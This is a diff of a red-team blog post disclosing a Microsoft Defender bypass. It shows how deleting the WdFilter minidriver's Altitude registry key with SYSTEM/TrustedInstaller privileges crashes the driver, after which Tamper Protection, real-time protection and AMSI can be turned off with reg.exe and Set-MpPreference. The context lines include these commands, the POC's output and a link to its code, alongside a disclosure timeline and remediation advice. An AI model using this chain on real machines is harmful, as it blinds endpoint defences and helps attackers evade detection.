@@ -1,8 +1,8 @@
 ---
 title: Disabling Tamper Protection and other Defender / MDE components 
-date: 2024-04-09 09:48:47 +07:00
+date: 2024-04-18 09:48:47 +07:00
 categories: RedTeaming
-#modified: 20-08-29 09:24:47 +07:00
+modified: 2024-04-18 09:49:47 +07:00
 #tags: [blog, netlify, jekyll, github]
 description: Crashing WdFilter to disable Tamper Protection and other Defender / MDE components
 #thumbnail: "https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Paces_Review/lab.png"
@@ -15,7 +15,7 @@ description: Crashing WdFilter to disable Tamper Protection and other Defender /
 - Jan 05, 2024 - Reported with POC through MSRC portal.
 - Jan 11, 2024 - MSRC team confirmed. MSRC ticket was moved to Review / Repro.
 - Mar 07, 2024 - MSRC status was changed to Complete stating "unable to reproduce this issue."
-- Apr 10, 2024 - Public release of Blog and POC.
+- Apr 08, 2024 - Public release of Blog and POC.
 
 ## Platform
 
@@ -33,7 +33,7 @@ It is possible to abuse SYSTEM / TrustedInstaller privileges to tamper WdFilter 
 
 A POC has been crafted along with explanation of the vulnerability with methods of remediation and possibilities to enhance the efficiency / OPSEC of the current technique.
 
-Below is a sample screenshot showcasing the POC crafted to abuse this bypass and disable WdFilter, Tamper Protection and Real-time monitoring (AMSI) on a target Server 2022 MDE testlab instance.
+Below is a sample screenshot showcasing the POC crafted to abuse this bypass and disable WdFilter, Tamper Protection and Real-time protection (AMSI) on a target updated Server 2022 MDE testlab instance.
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020240311143923.png)
 
@@ -43,18 +43,18 @@ Below is a sample screenshot showcasing the POC crafted to abuse this bypass and
 Tamper Protection in Windows Security **helps prevent malicious apps from changing important Microsoft Defender Antivirus settings**, including real-time protection and cloud-delivered protection. With the introduction of Tamper Protection, it is not possible to disable Defender settings using commands such as `Set-MpPreference -DisableRealtimeMonitoring $true`.
 
 To disable Tamper Protection via registry, the registry subkey - `TamperProtection` located at `HKLM\SYSTEM\CurrentControlSet\Services\WinDefend` should be set from `5` to `0/4`.  
-It is not possible to modify registry subkey values at `HKLM\SYSTEM\CurrentControlSet\Services\WinDefend` even using SYSTEM / TrustedInstaller privileges on newer windows versions because "**Windows Defender has a kernel-mode driver (WdFilter.sys) that registers a Registry callback filter which protects Defender’s registry keys**." 
+It is not possible to modify registry subkey values at `HKLM\SYSTEM\CurrentControlSet\Services\WinDefend` even using SYSTEM / TrustedInstaller privileges because "**Windows Defender has a kernel-mode driver (WdFilter.sys) that registers a Registry callback filter which protects Defender’s registry keys**." 
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124161502.png)
 
 In short, the Defender protection chain is as follows: 
-*WdFilter (prevents Tamper protection and other defender registry key alteration) → Tamper Protection (prevents Defender settings alteration) → Defender settings and registry keys enable AV / MDE on the target (RealTimeMonitoring / IOAVProtection etc.)*
+*WdFilter (prevents Tamper protection and other defender registry key alteration) → Tamper Protection (prevents Defender settings alteration) → Defender settings and registry keys enable AV / MDE on the target (Real-time protection / IOAVProtection etc.)*
 
 To disable Defender / MDE settings, it is required to disable these prior protections (WdFilter + Tamper Protection regkey) safeguarding it.
 
-In theory, if it is possible to unload, crash / stop the WdFilter kernel minidriver from running, the Defender service can be stopped from using the WdFilter kernel minidriver from processing events and intern protecting Tamper Protection and other Defender's Registry Keys, after which it should be possible to disable Tamper Protection and other settings such as RealTimeMonitoring.
+In theory, if it is possible to unload, crash / stop the WdFilter kernel minidriver from running, the Defender service can be stopped from using the WdFilter kernel minidriver from processing events and intern protecting Tamper Protection and other Defender's Registry Keys, after which it should be possible to disable Tamper Protection and other settings such as Real-time protection.
 
-Trying to unload the WdFilter kernel minidriver using administrator privileges results in an error.
+Trying to unload the WdFilter kernel minidriver using the `fltmc unload` command with Administrator / SYSTEM privileges results in an error.
 
 ```
 C:\Windows\System32> fltmc
@@ -80,7 +80,7 @@ Do not detach the filter from the volume at this time.
 
 [Sektor7](https://institute.sektor7.net/rto-maldev-intermediate) showcased that by changing the "Altitude number" of the Sysmon Kernel Minidriver to that of an already existing minidriver it is possible to break Sysmons functionality and disrupt the Sysmon Minidriver from processing events. It is possible to take inspiration from this technique to disrupt Defender's WdFilter minidriver and its kernel processing events.
 
-Since it isn't possible to unload the WdFilter kernel minidriver using elevated privileges such as SYSTEM / TrustedInstaller (using a command like: `fltmc unload WdFilter`), one method that did work is to use such privileges to crash the WdFilter service by removing or altering an important registry subkey like the "Altitude number" of the WdFilter Kernel Minidriver.
+Since it isn't possible to unload the WdFilter kernel minidriver using elevated privileges such as SYSTEM / TrustedInstaller with a standard command like: `fltmc unload WdFilter`, one method that did work is to use such privileges to crash the WdFilter service by removing or altering an important registry subkey like the "Altitude number" of the WdFilter Kernel Minidriver.
 
 From above, it is noted that the WdFilter kernel minidriver has an altitude number of: `328010`
 
@@ -155,7 +155,7 @@ npsvctrig                               1        46000         0
 Wof                                     1        40700         0
 ```
 
-Now that the WdFilter kernel minidriver is no longer loaded and protecting the Defender Registry Keys, successfully proceed to disable these unprotected keys, in this case the Tamper Protection regkey as it is the next protection chain in line to finally in turn disable defender protections like RealTimeMonitoring.
+Now that the WdFilter kernel minidriver is no longer loaded and protecting the Defender Registry Keys, successfully proceed to disable these unprotected keys, in this case the Tamper Protection regkey as it is the next protection chain in line to finally in turn disable defender protections like Real-time protection.
 
 Continue disabling Tamper Protection using reg.exe in the newly spawned NSudo elevated prompt as before by setting the `TamperProtection` subkey to `4/0`:
 
@@ -168,7 +168,7 @@ The operation completed successfully.
 Finally, since Tamper Protection is now disabled leaving Defender / MDE settings vulnerable to change, disable AV and AMSI in a standard PowerShell Administrator prompt (SYSTEM / TrustedInstaller privileges are not mandatory) using the following commands:
 
 ```
-# Disable realtime monitoring altogether
+# Disable Real-time protection altogether
 PS C:\Users\Administrator> Set-MpPreference -DisableRealtimeMonitoring $true
 
 # Only disables scanning for downloaded files or attachments
@@ -189,13 +189,13 @@ The attack chain can be summarized as follows:
 
 ## Proof of Concept
 
-A POC has been included, called Disable-TamperProtection which can be found on GitHub here: <https://github.com/m3rcer/Disable-TamperProtection>
+A POC has been included, called Disable-TamperProtection which can be found on GitHub here: https://github.com/m3rcer/Disable-TamperProtection
 
 *NOTE: VC_redist.x64.exe could be required on the target.*
 
 Required elevated privileges to perform the attack have been incorporated in the POC by using the superUser project codebase as a reference for TrustedInstaller privilege impersonation. 
 
-POC Video Demo: <https://www.youtube.com/watch?v=aGTrjDxMSdU>
+POC Video Demo: https://www.youtube.com/watch?v=aGTrjDxMSdU
 
 The POC works in 3 steps (Admin privileges required):
 
@@ -220,7 +220,7 @@ C:\Users\User\Desktop> .\Disable-TamperProtection.exe 1
 [+] Created process ID: 3744 and assigned additional token privileges.
 [+] Execute option 1 to validate!
 
-# Upon 2nd execution if the above output repeats the target isn't vulnerable
+# Upon 2nd exec if the above output repeats the target isn't vulnerable
 C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
 [+] WdFilter Altitude Registry key has been successfully deleted.
 [+] Enumerating WdFilter information:
@@ -258,14 +258,14 @@ C:\Users\User\Desktop>.\Disable-TamperProtection.exe 3
 
 *NOTE: Even though Tamper Protection is effectively disabled now, it takes a reboot to render the same change in the "Security Settings" GUI Prompt.*
 
-The POC manages to semi-permanently disable Real time monitoring (grey out) after Tamper Protection is disabled. This can be remediated using option 4.
+The POC manages to semi-permanently disable Real-time protection (grey out) after Tamper Protection is disabled. This can be remediated using option 4.
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020240311143923.png)
 
-4) Reinstate / restore the WdFilter minidriver, TamperProtection and Defender Settings (Real-Time). Make sure to change the Altitude number (Default: 328010) back to it's original value at line 530 in the POC.  
+4) Optionally reinstate the WdFilter minidriver, TamperProtection and Defender Settings (Real-time protection) utilizing option 4. Make sure to change the Altitude number (Default: 328010) back to it's original value at line 530 in the POC.  
 
 ```
-# Restart the computer after execution to restore settings successfully
+# Restart the computer to restore settings successfully
 C:\Users\User\Desktop>.\Disable-TamperProtection.exe 4
 [+] WdFilter Altitude Registry key has been successfully deleted.
 [+] Make sure to change Altitude in Source (Default: 328010) and reboot computer after execution.
@@ -341,7 +341,7 @@ The operation completed successfully.
 After performing a reboot, Tamper Protection re-enables along with Real-Time Protection and restores it back to its original protected state. Real-Time Protection can optionally be manually re-enabled in an Admin PowerShell session using:
 
 ```
-# Enable realtime monitoring altogether
+# Enable Real-time protection altogether
 PS C:\Users\Administrator> Set-MpPreference -DisableRealtimeMonitoring $false
 
 # Enables scanning for downloaded files or attachments
@@ -352,6 +352,10 @@ The Proof of Concept (POC) incorporates functionality to reinstate the WdFilter 
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124191854.png)
 
+## Remediation
+
+To remediate this vulnerability, avoid permitting TrustedInstaller / SYSTEM privileges to alter and delete sensitive Defender registry keys such as the `HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance\Altitude` registry key as patched in latest Windows versions.
+
 ## Credits and References
 
 - [Sektor7's evasion course](https://institute.sektor7.net/rto-win-evasion)
@@ -359,6 +363,10 @@ The Proof of Concept (POC) incorporates functionality to reinstate the WdFilter 
 - [superUser](https://github.com/mspaintmsi/superUser)
 - [Research paper on Blinding Defender](https://arxiv.org/ftp/arxiv/papers/2210/2210.02821.pdf)
 - [MDEInternals by FalconForce](https://www.first.org/resources/papers/conf2022/MDEInternals-FIRST.pdf)
+
+
+
+
 
 
 
